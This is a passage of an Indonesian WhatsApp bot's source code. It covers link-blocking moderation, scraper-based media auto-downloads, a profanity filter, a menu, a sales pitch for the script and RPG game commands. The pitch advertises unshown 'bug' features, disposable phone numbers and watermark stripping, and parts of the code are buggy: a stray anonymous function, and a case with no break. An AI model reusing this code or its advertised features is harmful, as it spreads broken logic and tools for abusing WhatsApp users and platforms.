/*Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Alice.sendMessage(m.chat, {text:`\`\`\`「 Link Terdeteksi 」\`\`\`\n\n@${pushname} Jangan kirim link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
} else {
}
//antilinkbokep 
if (AntiDewasa)
if (budy.toLowerCase().includes("doods")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun`
if (isAdmins) return reply(bvl)
if (mek.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Alice.sendMessage(m.chat, {text:`\`\`\`「 Link Terdeteksi 」\`\`\`\n\n@${pushname} Jangan kirim link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
} else {
}
//antiterabox 
if (AntiTerabox)
if (budy.toLowerCase().includes("terabox")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun`
if (isAdmins) return reply(bvl)
if (mek.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Alice.sendMessage(m.chat, {text:`\`\`\`「 Link Terdeteksi 」\`\`\`\n\n@${pushname} Jangan kirim link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
} else {
}
//anti mediafire 
if (AntiMediafire)
if (budy.toLowerCase().includes("mediafire")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun`
if (isAdmins) return reply(bvl)
if (mek.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
await Alice.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*Alice.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
Alice.sendMessage(m.chat, {text:`\`\`\`「 Link Terdeteksi 」\`\`\`\n\n@${pushname} Jangan kirim link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted: m})
} else {
}
			
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// AutoDownload

// AUTODOWNLOAD
if (global.autodonlod && !m.key.fromMe)
if (budy.match(/tiktok\.com/)) {
await tiktok2(budy).then(async res => {
await XReaction()
await Alice.sendMessage(m.chat, { video: { url: res.no_watermark }, caption: res.title }, { quoted: m });
await Alice.sendMessage(m.chat, { audio: { url: res.no_watermark }, mimetype: 'audio/mpeg', ptt: false }, { quoted: m });
}).catch((err) => {
reply('Maaf, terjadi kesalahan!');
}); // pengalih isu
}
    
if (global.autodonlod && !m.key.fromMe)
if (budy.match(/youtube\.com|youtu\.be/)) {
        await XReaction()
        try {
            let cari = await fetchJson(`${global.beta}/api/download/ytmp3?url=${budy}&apikey=${global.botz}`)
            let hasil = cari.result;
           await Alice.sendMessage(m.chat, { video: { url: hasil.mp4 }, caption: cari.title }, { quoted: m });
           await Alice.sendMessage(m.chat, { audio: { url: hasil.mp3 }, mimetype: 'audio/mpeg', ptt: false }, { quoted: m });
        } catch (e) {
            console.log(e)
            let response = await SaveTube.dl(budy, 2, 'video')
            await Alice.sendMessage(m.chat, { video: { url: response.link }, caption: `Succes\n© ${botname}` }, { quoted: m })
          }
    }

if (global.autodonlod && !m.key.fromMe)
if (budy.match(/instagram\.com/)) {
    await XReaction()
        try {
            const mediaUrl = await igdl(budy);
            const url_media = mediaUrl[0].url;
            const response = await axios.head(url_media);
            const contentType = response.headers['content-type'];
            if (contentType.startsWith('image/')) {
                await Alice.sendMessage(m.chat, { image: { url: url_media }, caption: `Succes\n© ${botname}` }, { quoted: m });
            } else {
                await Alice.sendMessage(m.chat, { video: { url: url_media }, caption: `Succes\n© ${botname}` }, { quoted: m });
            }
        } catch (error) {
            console.log(error);
            return reply(`Terjadi kesalahan saat mengunduh media.` + error)
        }
    }
if (global.autodonlod && !m.key.fromMe)
if (budy.match(/facebook\.com/)) {
await XReaction()
    try {
      let res = await fdown.download(budy);
      if (res && res.length > 0) {
        let videoData = res[0]; 
        let videoUrl = videoData.hdQualityLink || videoData.normalQualityLink; 
        if (videoUrl) {
          let caption = `*Title:* ${videoData.title}\n*Description:* ${videoData.description}\n*Duration:* ${videoData.duration}`;
          await Alice.sendMessage(m.chat, { 
            video: { url: videoUrl }, 
            caption: caption, 
            mimetype: 'video/mp4'
          }, { quoted: m });
        }
      } else {
        return reply(mess.error)
      }
    } catch (e) {
      console.log(e);
      XRR()
    }
  } 
  

if (m.mtype.includes("groupStatusMentionMessage") && m.isGroup) {
                const idgc = m.key.remoteJid;
                const participant = m.sender
                
                if (idgc.endsWith("@g.us")) {
                    await Alice.sendMessage(idgc, {
                        text: `@${participant.split("@")[0]} your message was deleted, because you tried to mention this group`, 
                        contextInfo: {
                            mentionedJid: [participant],
                            showAdtibution: true
                        }
                    }, { quoted: m })
                    await Alice.deleteMessage(idgc, m.key);
                }
            }
           
        
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Batas Antilink
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\


if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
Alice.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})} else {
Alice.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {quoted: m})
}}


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\

//————————————————————————//
//————————————————————————//
//————————————————————————//
// Reactuon

		async function reactionMessage(emo) {
			Alice.sendMessage(m.chat, {
				react: {
					text: emo,
					key: m.key
				}
			});
		}
		
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\

function formatmoney(amount, options = {}) {
  const {
    currency = "IDR",
    locale = "id",
    minimumFractionDigits = 0,
    maximumFractionDigits = 0,
    useSymbol = true
  } = options;

  const formattedAmount = amount.toLocaleString(locale, {
    style: "currency",
    currency,
    minimumFractionDigits,
    maximumFractionDigits,
  });

  return useSymbol ? formattedAmount : formattedAmount.replace(/[^\d.,]/g, '');
}

async (source, filename, options) => {
      try {
         if (Buffer.isBuffer(source)) {
            let ext, mime
            try {
               mime = await (await fromBuffer(source)).mime
               ext = await (await fromBuffer(source)).ext
            } catch {
               mime = require('mime-types').lookup(filename ? filename.split`.` [filename.split`.`.length - 1] : 'txt')
               ext = require('mime-types').extension(mime)
            }
            const extension = filename ? filename.split`.` [filename.split`.`.length - 1] : ext
            const size = Buffer.byteLength(source)
            const filepath = 'temp/' + (this.uuid() + '.' + ext)
            const file = fs.writeFileSync(filepath, source)
            const name = filename || path.basename(filepath)
            return new Promise(resolve => {
               const data = {
                  status: true,
                  file: filepath,
                  filename: name,
                  mime: mime,
                  extension: ext,
                  size: this.formatSize(size),
                  bytes: size
               }
               return resolve(data)
            })
         } else if (source.startsWith('./') || source.startsWith('/')) {
            const mime = require('mime-types').lookup(filename ? filename.split`.` [filename.split`.`.length - 1] : source.split`.` [source.split`.`.length - 1])
            const ext = require('mime-types').extension(mime)
            const extension = filename ? filename.split`.` [filename.split`.`.length - 1] : ext
            const size = fs.statSync(source).size
            const name = filename || path.basename(source)
            return new Promise(resolve => {
               const data = {
                  status: true,
                  file: source,
                  filename: name,
                  mime: mime,
                  extension: ext,
                  size: this.formatSize(size),
                  bytes: size
               }
               return resolve(data)
            })
         } else {
            return new Promise(resolve => {
               const mg = new Miniget(source, {
                  headers: {
                     "Accept": "*/*",
                     "User-Agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J500G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
                     "Referrer-Policy": "strict-origin-when-cross-origin",
                     "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
                     "sec-ch-ua-platform": "Android",
                     "sec-fetch-dest": "empty",
                     "sec-fetch-mode": "cors",
                     "sec-fetch-site": "same-origin",
                     ...options
                  }
               })
               mg.on('response', (response) => {
                  if (response.statusCode !== 200) {
                     resolve({
                        status: false,
                        msg: `[${response.statusCode}] : Error while gwtting file`
                     })
                     return
                  }
                  const extension = filename ? filename.split`.` [filename.split`.`.length - 1] : mime.extension(response.headers['content-type'])
                  const file = fs.createWriteStream(`temp/${this.uuid() + '.' + extension}`)
                  const name = filename || path.basename(file.path)
                  const transformStream = new stream.Transform({
                     transform(chunk, encoding, callback) {
                        callback(null, chunk)
                     }
                  })
                  mg.pipe(transformStream).pipe(file)
                  file.on('finish', () => {
                     const data = {
                        status: true,
                        file: file.path,
                        filename: name,
                        mime: mime.lookup(file.path),
                        extension: extension,
                        size: this.formatSize(response.headers['content-length'] ? response.headers['content-length'] : 0),
                        bytes: response.headers['content-length'] ? parseInt(response.headers['content-length']) : 0,
                        headers: response.headers
                     }
                     resolve(data)
                  })
                  .on('error', (error) => {
                     resolve({
                        status: false,
                        msg: `Error when getting the file`
                     })
                  })
               })
            })
         }
      } catch (e) {
         return ({
            status: false,
            msg: e.message
         })
      }
   }

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Only Group
if (!m.isGroup && !isOwner && !isPrem && db.data.settings[botNumber].onlygrub ) {
	if (command){
return reply(`Hai ${m.pushName}, Karena Kami Ingin Mengurangi Spam Terhadap Bot, Silahkan Gunakan Bot ${botname} Di Group Chat, Atau Buy Premium/Sewa Untuk Mendapatkan Akses User Premium Dan Dapat Digunakan Di Private Chat!\n\nLink Group Bot: ${groupbot} !`)
}
}

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Mute Group
if (m.isGroup && isMute) {
if (!isOwner) return
}

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Command No Prefix
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\

if (m.isGroup) {
    if (body.includes(`@${owner}`)) {
        reaction(m.chat, "❌")
    }
 }

if ((budy.match) && ["ap", "Y", "y", "o", "O", "?",].includes(budy) && !isCmd) {
Alice.sendMessage(m.chat, { audio: { url: soundcool }, mimetype: 'audio/mpeg' }, { quoted: m })
}

// Runtime Command No Prefix
if ((budy.match) && ["runtime",].includes(budy) && !isCmd) {
reply(`${botname}\nRuntime : ${runtime(process.uptime())}\ `)
}		

// Tes Command No Prefix		
if ((budy.match) && ["tes",].includes(budy) && !isCmd) {
reply(`${botname} A WhatsApp Bot`)
}	

// Toxic
if ((budy.match) && ["babi", "kntl", "kontol", "bujang", "mmq", "mmk", "memek", "iclik", "ktl", "anjing", "anj",].includes(budy)) {
reply(`
*مَا شَيْءٌ أَثْقَلُ فِيْ مِيْزَانِ الْمُؤْمِنِ يَوْمَ الْقِيَامَةِ مِنْ خُلُقٍ حَسَنٍ وَإِنَّ اللهَ لَيُبْغِضُ الْفَاحِشَ الْبَذِيْءَ*

_“Sesungguhnya tidak ada sesuatu apapun yang paling berat ditimbangan kebaikan seorang mu’min pada hari kiamat seperti akhlaq yang mulia, dan sungguh-sungguh (benar-benar) Allāh benci dengan orang yang lisānnya kotor dan kasar.”_

\`jangan toxic lagi ya kak\` *@${pushname}* ☺`)
}

// Sepuh Command No Prefix With Ptv 
if ((budy.match) && ["sepuh", "Sepuh", "puh", "Puh"].includes(budy) && !isCmd) {
 let msg = await generateWAMessageContent({
 video: { url: 'https://telegra.ph/file/2ff6d0005fc4a32f67f65.mp4' }
 }, {
 upload: Alice.waUploadToServer
 })
 let ptv = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({ ptvMessage: msg.videoMessage }), { userJid: m.chat, quoted: m })
 await Alice.relayMessage(m.chat, ptv.message, { messageId: ptv.key.id })
} 

 
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
switch(command) {
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// All Fitur Case Di Bawah ↓
case 'menu':
case 'listmenu':
case 'help': {
    if (isBan) return XRB()
    await XReaction()

    const kategoriMenu = [
        "all", "cpanel", "push", "berita", "audio", "anonymous", "store", "main",
        "ai", "convert", "tooks", "islami", "downloader", "premium", "search",
        "ephoto", "primbon", "random", "group", "owner", "game", "rpg"
    ]

    let menulice = Styles(`╭─🎖️ *[ Gᴜɪʟᴅ Cᴏɴsᴏʟᴇ - Aʟɪᴄᴇ Sʏsᴛᴇᴍ ]*
│ 🧩 *Bot:* ${botname}
│ ⚙️ *Prefix:* ${Xyroo}
│ 🪄 *Version:* ${version}
│ 📜 *Total Skill:* ${totalfitur()} Command
│ 💠 *Engine:* ${baileys}
│ 
│ 🗺️ *Realm Status*
│ ╰🖥️ OS: ${os.platform().toUpperCase()} | ${os.arch()}
│ ╰💾 RAM: ${(os.freemem() / 1024 / 1024).toFixed(2)} / ${(os.totalmem() / 1024 / 1024).toFixed(2)} MB
│ ╰⚙️ CPU: ${os.cpus()[0].model}
╰────────────────────────────`);

    let alicejr = Styles(`📜 *Peringatan Suci dari Guild Master:*
❌ Dilarang keras menelpon penjaga sistem (bot) via jalur pribadi.
⚔️ Penyalahgunaan perintah akan membangkitkan kutukan SPAM, dan bot bisa hilang dari dunia ini.

🕊️ Gunakan kemampuanmu dengan bijak, Petualang.
\n\n🎗️ *Insignia*: ${packname}`);

    let kategori = (args[0] || command.replace("menu", "")).toLowerCase()

    if (!kategori || !kategoriMenu.includes(kategori)) {
        // Menu utama (jika tidak ada argumen)
        let menu = Styles(`📖 *Grimoire Aᴘʟɪᴋᴀꜱɪ - Alice RPG*

🧩 *Data Realm*
Prefix : ${Xyroo}
Bot    : ${botname}
Versi  : ${version}
Fitur  : ${totalfitur()} Command

🧬 *Sistem:*
OS   : ${os.platform().toUpperCase()} / ${os.arch()}
RAM  : ${(os.freemem() / 1024 / 1024).toFixed(2)} MB
CPU  : ${os.cpus()[0].model}

📚 *Daftar Guild Skill:*
${kategoriMenu.map(v => `╰📁 .menu ${v}`).join('\n')}

🎯 *Gunakan perintah*: *.menu <kategori>*
🔮 Contoh: *.menu rpg*, *.menu game*

⚠️ *Catatan*: Spam akan menciptakan celah pada dunia ini...`);

        await Alice.sendMessage(m.chat, {
            image: { url: thumbWelcome },
            caption: menu
        }, { quoted: XR })

        await Alice.sendMessage(m.chat, {
            audio: { url: licevoice },
            mimetype: 'audio/mpeg',
            ptt: true
        }, { quoted: m })

        return
    }

    // Menu per kategori
    let isiMenu = global[`${kategori}menu`] || `❌ Kategori "${kategori}" belum tersedia di Grimoire.`
    let teks = Styles(`${menulice}\n\n${isiMenu}\n\n${alicejr}`)

    await Alice.sendMessage(m.chat, {
        image: { url: thumbWelcome },
        caption: teks
    }, { quoted: XR })

    await Alice.sendMessage(m.chat, {
        audio: { url: licevoice },
        mimetype: 'audio/mpeg',
        ptt: true
    }, { quoted: m })
}
break;
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
// Command Owner Prefix
case 'owner': case 'botowner':
let namaown = `${ownername}`
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `${namaown}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${ownername}\nitem1.TEL;waid=${global.owner}:+${global.owner}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:${ownername}\nX-WA-BIZ-NAME: ${ownername}\nEND:VCARD`,
}
}), { userJid: m.chat, quoted: m })
Alice.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
break

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//Source Code
case 'sc': 
case 'script':
let sc = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                           *✨ SCRIPT ALICE ASISTENT ✨*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[ *SCRIPT ALICE ASSISTENT* ]
Bot WhatsApp Serba Guna Dan Serba Otomatis Yang Dapat Membantu Anda Mencari Informasi Atau Mendownload Sosial Media, Dan Bisa Juga Bermain Game Dengan Fitur Fitur Keren Yang Sudah Disediakan

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                             *✨ FITUR UNGGULAN ✨*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

• Using Scraper
• 830+ Fitur Keren
• Bug Features Func
• Push/Simpan Kontak
• Cpanel & Button UI
• Add/Kick Member Group
• Ukuran ringan & Cepat!
• Play Youtube Langsung
• Support Button Old/New
• Setppbot && Setpppanjang
• ChatBot AI (10+ model AI!)
• Convert Teks ke Anime/Ghibli
• Antilink – Cocok buat jaga grup
• Antitoxic – Aman dari kata kasar
• Toreal - Convert Real To Anime
• Voice Michie - Tokoh Member Jkt48
• Voice Prabowo - Presiden Indonesia 2025
• Voice Megawati - Mantan Presiden Indonesia
• Type Case Dan Sudah Support Plugins Cjs
• Toanime - Convert Real To Anime Model
• Welcome Message – Bikin grup makin rame
• Brat - Sticker Brat Viral Backround Putih
• Bratvid - Sticker Brat Dengan Video Gerak
• Spotify - Putar Lagu Dari Aplikasi Spotify
• Smeme - Sticker Menggunakan Teks Meme
• AutoDownload dari xtele, TikTok, YT, Mediafire
• Downloader (xtele, TikTok, YouTube - mp3/mp4)
• Orkut Gateway - Pembayaran Otomatis Via Qris
• Sticker - Convert Image & Video Menjadi Sticker
• Cekasalmember - Cek Asal Negara Member Group
• Topcmd - Melihat 10 Command Paling Sering Digunakan
• Warn, Delwarn, Setwarn, Reswarn - Peringatan Untuk Member
• Dan Masih Banyak Lagi Fitur Menarik Dan Keren Lainnya


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                     *✨ BONUS DAN BENEFIT YANG DI DAPAT*✨
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

✓ Size Ringan
✓ Free API Key
✓ Clean & Cepat!
✓ Support All Run
✓ Free Fix & Update
✓ Update Setiap Hari
✓ Free Panel Unli Private
✓ Free Nomor Kosong Indonesia
✓ Free Scrape Data (30+ total scrape)
✓ Dapat Group Update & Support Eksklusif
✓ Bebas Recode, Rename, & Request Fitur
✓ 80% Fitur Scrape, 10% API, 10% Module

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                *✨ TUNGGU APALAGI? LANGSUNG ORDER SEKARANG!!!*✨
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

- Tunggu Apalagi? Gas Belii
- Harga Cuma 60k/Rp 60.000
- Free Update & Sudah Full Bonus Loh
- wa: https://wa.me/6281543496975 ( 24 Jam! )
- tele: https://t.me/XyrooRinzii ( Off? Chat Wa )

— © XyrooRynzz 2025`

Alice.sendMessage(m.chat, {
    document: fs.readFileSync("./AliceZuberg.txt"),
    fileName: `「 Alice Assistent 」`,
    mimetype: 'image/png',
    jpegThumbnail: fs.readFileSync("./AliceMedia/image/Alice.png"), 
    contextInfo: {
        mentionedJid: [m.sender], 
        isForwarded: true,
        externalAdreply: {
        title: hariini, 
        body: packname, 
        thumbnail: fs.readFileSync("./AliceMedia/image/Alice.jpg"),
        sourceUrl: xtele,
       mediaType: 1,
        renderLargerThumbnail: true
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: idch,
            serverMessageId: null,
            newsletterName: botname
        },
    },
    caption: sc,
  buttons:  [
  {
    buttonId: `${prefix}menu`,
    buttonText: { displayText: 'Back To Menu' }
  },
],
  headerType: 1,
  viewOnce: true
}, {})
break

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//        
// RPG Features
//📈————————————————————————— [ Features ↓↓ ] —————————————————————————📉\\
case 'storyquest': {
  initRpgUser(sender)
  let user = rpgDb[sender]

  let story = user.story || 0
  let list = [
    '🌄 Kamu terbangun di desa terpencil...',
    '🧙 Seorang penyihir tua memanggilmu untuk misi suci...',
    '🐉 Kamu mendengar rumor tentang naga di gunung utara...',
    '🏰 Sebuah kerajaan membutuhkan pertolonganmu...',
    '☠️ Sebuah makhluk gelap mengintai dunia ini...'
  ]
  let teks = `📜 *STORY QUEST*\n\n${list[story % list.length]}\n\nKetik *nextquest* untuk lanjut cerita.`
  return reply(teks)
}
case 'narrator': {
  let teks = `🎙️ *Narator Berbisik...*\n\n“Langkahmu baru saja dimulai. Dunia menantimu.”\n\nGunakan *storyquest* untuk menjelajah kisahmu.`
  return reply(teks)
}
case 'timetravel': {
  initRpgUser(sender)
  let user = rpgDb[sender]
  if (user.timetravel && Date.now() - user.timetravel < 86400000)
    return reply(`⏳ Kamu sudah melakukan perjalanan waktu hari ini.\nCoba lagi besok.`)

  user.timetravel = Date.now()
  let reward = Math.floor(Math.random() * 1000 + 1000)
  user.gold += reward
  saveRpg()
  return reply(`🌀 Kamu melakukan perjalanan waktu dan menemukan ${reward} gold dari masa lalu!`)
}
case 'reincarnate': {
  initRpgUser(sender)
  let user = rpgDb[sender]
  if (user.level < 30) return reply(`🧘 Hanya yang sudah mencapai level 30 bisa bereinkarnasi.`)

  user.level = 1
  user.exp = 0
  user.gold = 0
  user.reincarnation = (user.reincarnation || 0) + 1
  user.passiveBonus = (user.passiveBonus || 0) + 5
  saveRpg()
  return reply(`🔁 Kamu telah bereinkarnasi!\nBonus permanen: +5% power setiap kali kamu bereinkarnasi.`)
}
case 'distortion': {
  let efek = ['🌪️ Kabut misterius mengelilingimu', '🪞 Cermin waktu retak', '🕳️ Lubang ke dimensi lain terbuka']
  let loot = ['potion', 'elixir', 'fabric', 'bone', 'gold']
  let dapat = loot[Math.floor(Math.random() * loot.length)]
  let jumlah = Math.floor(Math.random() * 3 + 1)

  initRpgUser(sender)
  let user = rpgDb[sender]
  for (let i = 0; i < jumlah; i++) user.inv.push(dapat)
  saveRpg()

  return reply(`${efek[Math.floor(Math.random() * efek.length)]}\n\n🎁 Kamu mendapat ${jumlah}x *${dapat}* dari zona distorsi.`)
}
case 'level': {
  initRpgUser(sender, pushname)
  let user = rpgDb[sender]
  let persen = ((user.exp / user.maxExp) * 100).toFixed(1)

  let teks = `📈 *LEVEL PROGRESS*

🎚️ Level: ${user.level}
🔸 Exp: ${user.exp} / ${user.maxExp} (${persen}%)
🧠 Job: ${user.job || 'None'}
🧬 Skill: ${user.skill?.join(', ') || 'Belum ada'}

Ketik *work*, *quest*, atau *hunt* untuk dapat EXP!
`
  return reply(teks)
}
case 'equip': {
  initRpgUser(sender, pushname)
  if (!text) return reply('Ketik nama item yang ingin kamu equip.')

  let user = rpgDb[sender]
  let index = user.inventory.findIndex(item => item.nama.toLowerCase() === text.toLowerCase())

  if (index === -1) return reply('Item tidak ditemukan di inventory kamu.')

  let item = user.inventory[index]

  if (item.tipe === 'weapon') user.equip.weapon = item.nama
  else if (item.tipe === 'armor') user.equip.armor = item.nama
  else return reply('Item ini tidak bisa di-equip.')

  reply(`✅ ${item.nama} berhasil dipasang!`)
}
case 'unequip': {
  initRpgUser(sender, pushname)
  let user = rpgDb[sender]
  let removed = []

  if (user.weapon) {
    user.inv.push(user.weapon)
    removed.push(`🗡️ ${user.weapon}`)
    user.weapon = ''
  }
  if (user.armor) {
    user.inv.push(user.armor)
    removed.push(`🛡️ ${user.armor}`)
    user.armor = ''
  }

  if (!removed.length) {
    reply(`Kamu tidak sedang memakai senjata atau armor.`)
    break
  }

  saveRpg()
  reply(`🔧 Kamu melepas:\n${removed.join('\n')}`)
  break
}
case 'duel': {
  initRpgUser(sender, pushname)
  let user = rpgDb[sender]
  let targetId = m.quoted ? m.quoted.sender : text?.split('@')[1]?.trim()?.replace(/[^0-9]/g, '')

  if (!targetId) {
    reply(`reply chat musuhmu atau ketik nomor target (tanpa +62). Contoh: *duel 81234567890*`)
    break
  }

  targetId = targetId.includes('@s.whatsapp.net') ? targetId : targetId + '@s.whatsapp.net'
  initRpgUser(targetId)

  let target = rpgDb[targetId]
  if (targetId === sender) {
    reply(`⚔️ Kamu tidak bisa duel dengan dirimu sendiri.`)
    break
  }

  // Hitungan dasar damage
  let weaponBonus = {
    pedang: 20,
    kapak: 25,
    panah: 15
  }
  let armorBonus = {
    armor: 15,
    perisai: 20,
    jubah: 10
  }

  let userPower = 50 + (weaponBonus[user.weapon] || 0)
  let targetPower = 50 + (weaponBonus[target.weapon] || 0)

  let userDefense = (armorBonus[user.armor] || 0)
  let targetDefense = (armorBonus[target.armor] || 0)

  let userTotal = userPower - targetDefense + Math.floor(Math.random() * 30)
  let targetTotal = targetPower - userDefense + Math.floor(Math.random() * 30)

  let winner, loser
  if (userTotal > targetTotal) {
    winner = user
    loser = target
    user.exp += 100
    user.coin += 150
    target.exp += 25
    target.coin = Math.max(0, target.coin - 100)
  } else if (targetTotal > userTotal) {
    winner = target
    loser = user
    target.exp += 100
    target.coin += 150
    user.exp += 25
    user.coin = Math.max(0, user.coin - 100)
  } else {
    reply(`⚔️ Duel antara kamu dan ${target.name} berakhir seri!`)
    break
  }

  saveRpg()

  reply(`⚔️ *DUEL HASIL*\n\n🏆 Pemenang: ${winner.name}\n💀 Kalah: ${loser.name}\n\n🎖️ +100 EXP | +150 Koin untuk Pemenang\n💸 -100 Koin untuk yang kalah`)
  break
}
case 'bank': {
  initRpgUser(sender, pushname)
  let user = rpgDb[sender]

  let args = text.trim().split(' ')
  let aksi = args[0]?.toLowerCase()
  let jumlah = parseInt(args[1])

  if (!aksi || isNaN(jumlah) || jumlah <= 0) {
    reply(`🏦 *BANK RPG*\n\nKetik:\n- *bank simpan 500* → Simpan 500 koin\n- *bank tarik 300* → Tarik 300 koin\n\n💰 Dompet: ${user.coin}\n🏦 Tabungan: ${user.bank}`)
    break
  }

  if (aksi === 'simpan') {
    if (user.coin < jumlah) {
      reply(`Uangmu tidak cukup untuk disimpan!`)
      break
    }

    user.coin -= jumlah
    user.bank += jumlah
    saveRpg()
    reply(`✅ Berhasil simpan ${jumlah} 💰 ke bank.\n💰 Sekarang: ${user.coin} | 🏦 Tabungan: ${user.bank}`)
    break
  }

  if (aksi === 'tarik') {
    if (user.bank < jumlah) {
      reply(`Tabunganmu tidak cukup!`)
      break
    }

    user.bank -= jumlah
    user.coin += jumlah
    saveRpg()
    reply(`✅ Berhasil tarik ${jumlah} 💰 dari bank.\n💰 Sekarang: ${user.coin} | 🏦 Tabungan: ${user.bank}`)
    break
  }

  reply(`Perintah tidak dikenali. Gunakan *bank simpan/tarik jumlah*`)
  break
}
case 'quest': {
  initRpgUser(sender, pushname)
  let user = rpgDb[sender]

  // Definisi misi quest harian (bisa kamu ganti tiap hari)
  const misi = {
    item: 'daging',
    jumlah: 2,
    reward: {
      coin: 300,
      exp: 200
    }
  }

  // Hitung jumlah item di inventory
  let count = user.inv.filter(i => i === misi.item).length

  // Sudah klaim hari ini?
  if (user.quest.dailyDone) {
    reply(`📜 Kamu sudah menyelesaikan quest harian hari ini!\nDatang lagi besok.`)
    break
  }

  // Belum cukup item
  if (count < misi.jumlah) {
    reply(`📜 *Misi Harian:*
🎯 Kumpulkan ${misi.jumlah} *${misi.item}*
🎁 Hadiah: ${misi.reward.coin} koin & ${misi.reward.exp} exp

Progress: ${count}/${misi.jumlah}
Gunakan: *quest* saat sudah lengkap.`)
    break
  }

  // Selesaikan quest
  let sisa = misi.jumlah
  user.inv = user.inv.filter(i => {
    if (i === misi.item && sisa > 0) {
      sisa--
      return false
    }
    return true
  })

  user.coin += misi.reward.coin
  user.exp += misi.reward.exp
  user.quest.dailyDone = true
  saveRpg()

  reply(`🎉 *Quest Harian Selesai!*
+${misi.reward.coin} 💰
+${misi.reward.exp} ⭐ EXP

Besok akan ada misi baru!`)
  break
}
case 'craft': {
  initRpgUser(sender, pushname)
  let user = rpgDb[sender]

  let bahan = ['tulang', 'kulit']
  let hasil = 'armor'

  // Cek bahan tersedia
  let bahanCukup = bahan.every(b => user.inv.includes(b))
  if (!bahanCukup) {
    reply(`🧪 Untuk membuat *${hasil}*, kamu butuh:\n- tulang\n- kulit`)
    break
  }

  // Buang bahan
  for (let b of bahan) {
    let i = user.inv.indexOf(b)
    if (i !== -1) user.inv.splice(i, 1)
  }

  user.inv.push(hasil)
  saveRpg()
  reply(`🧪 Kamu berhasil membuat *${hasil}*!`)
  break
}
case 'boss': {
  initRpgUser(sender, pushname)
  let bossHp = 100 + Math.floor(Math.random() * 100)
  let dmg = 30 + Math.floor(Math.random() * 40)

  reply(`👹 *KAMU MENANTANG BOSS!*\n\nBoss HP: ${bossHp}\nKamu serang dengan kekuatan ${dmg}...`)

  if (dmg >= bossHp) {
    rpgDb[sender].coin += 500
    rpgDb[sender].exp += 300
    saveRpg()
